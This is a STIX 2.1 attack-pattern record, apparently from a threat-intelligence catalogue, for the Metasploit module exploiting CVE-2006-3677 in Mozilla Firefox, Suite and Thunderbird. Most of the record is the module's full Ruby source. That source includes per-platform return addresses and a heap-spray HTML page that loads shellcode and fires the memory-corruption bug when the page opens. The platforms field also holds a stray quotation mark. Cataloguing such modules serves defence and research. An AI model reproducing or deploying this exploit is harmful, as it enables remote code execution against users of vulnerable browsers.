{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--92b4e794-67ca-49a2-aff0-f5b54614d53a",
    "created": "2024-08-14T17:05:31.098605Z",
    "modified": "2024-08-14T17:05:31.098611Z",
    "name": "Mozilla Suite/Firefox Navigator Object Code Execution",
    "description": " This module exploits a code execution vulnerability in the Mozilla Suite, Mozilla Firefox, and Mozilla Thunderbird applications. This exploit requires the Java plugin to be installed.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/browser/mozilla_navigatorjava.rb",
            "external_id": "mozilla_navigatorjava.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2006-3677"
        },
        {
            "source_name": "reference",
            "url": "http://www.mozilla.org/security/announce/mfsa2006-45.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  #include Msf::Exploit::Remote::BrowserAutopwn\n  #autopwn_info({\n  #  :ua_name    => HttpClients::FF,\n  #  :ua_minver  => \"1.5.0\",\n  #  :ua_maxver  => \"1.5.1\",\n  #  :javascript => true,\n  #  :rank       => NormalRanking, # reliable memory corruption\n  #  :vuln_test  => %Q|\n  #    is_vuln = false;\n  #    if (navigator.javaEnabled()){\n  #      is_vuln = true;\n  #    }\n  #    |,\n  #})\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Mozilla Suite/Firefox Navigator Object Code Execution',\n      'Description'    => %q{\n          This module exploits a code execution vulnerability in the Mozilla\n        Suite, Mozilla Firefox, and Mozilla Thunderbird applications. This exploit\n        requires the Java plugin to be installed.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>  ['hdm'],\n      'References'     =>\n        [\n          ['CVE',    '2006-3677'],\n          ['OSVDB',  '27559'],\n          ['BID',    '19192'],\n          ['URL',    'http://www.mozilla.org/security/announce/mfsa2006-45.html']\n        ],\n      'Payload'        =>\n        {\n          'Space'    => 512,\n          'BadChars' => \"\",\n        },\n      'Platform'       => %w{ win linux osx },\n      'Targets'        =>\n        [\n          [ 'Firefox 1.5.0.4 Windows x86',\n            {\n              'Platform' => 'win',\n              'Arch' => ARCH_X86,\n              'Ret'  => 0x08000800,\n              'Fill' => \"%u0800\",\n            }\n          ],\n          [ 'Firefox 1.5.0.4 Linux x86',\n            {\n              'Platform' => 'linux',\n              'Arch' => ARCH_X86,\n              'Ret'  => -0x58000000,\n              'Fill' => \"%ua8a8\",\n            }\n          ],\n          [ 'Firefox 1.5.0.4 Mac OS X PPC',\n            {\n              'Platform' => 'osx',\n              'Arch' => ARCH_PPC,\n              'Ret'  => 0x0c000000,\n              'Fill' => \"%u0c0c\",\n            }\n          ],\n          [ 'Firefox 1.5.0.4 Mac OS X x86',\n            {\n              'Platform' => 'osx',\n              'Arch' => ARCH_X86,\n              'Ret'  => 0x1c000000,\n              'Fill' => \"%u1c1c\",\n            }\n          ],\n        ],\n      'DisclosureDate' => '2006-07-25'\n      ))\n  end\n\n  def on_request_uri(cli, request)\n\n    # Re-generate the payload\n    return if ((p = regenerate_payload(cli)) == nil)\n\n    print_status(\"Sending #{self.name}\")\n    send_response_html(cli, generate_html(p), { 'Content-Type' => 'text/html' })\n\n    # Handle the payload\n    handler(cli)\n  end\n\n  def generate_html(payload)\n\n    enc_code = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))\n\n    return %Q|\n<html><head>\n<script>\n  function Exploit() {\n    if (window.navigator.javaEnabled) {\n      var shellcode = unescape(\"#{enc_code}\");\n      var b = unescape(\"#{target['Fill']}\");\n      while (b.length <= 0x400000) b+=b;\n\n      var c = new Array();\n      for (var i =0; i<36; i++) {\n        c[i] =\n          b.substring(0,  0x100000 - shellcode.length) + shellcode +\n          b.substring(0,  0x100000 - shellcode.length) + shellcode +\n          b.substring(0,  0x100000 - shellcode.length) + shellcode +\n          b.substring(0,  0x100000 - shellcode.length) + shellcode;\n      }\n\n      window.navigator = (#{target['Ret']} / 2);\n      try {\n        java.lang.reflect.Runtime.newInstance(\n          java.lang.Class.forName(\"java.lang.Runtime\"), 0\n        );\n      }catch(e){\n\n      }\n    }\n  }\n</script>\n</head><body onload='Exploit()'>Please wait...</body></html>\n    |\n  end\nend\n",
    "x_mitre_disclosure_date": "2006-07-25",
    "x_mitre_platforms": [
        "osx'"
    ]
}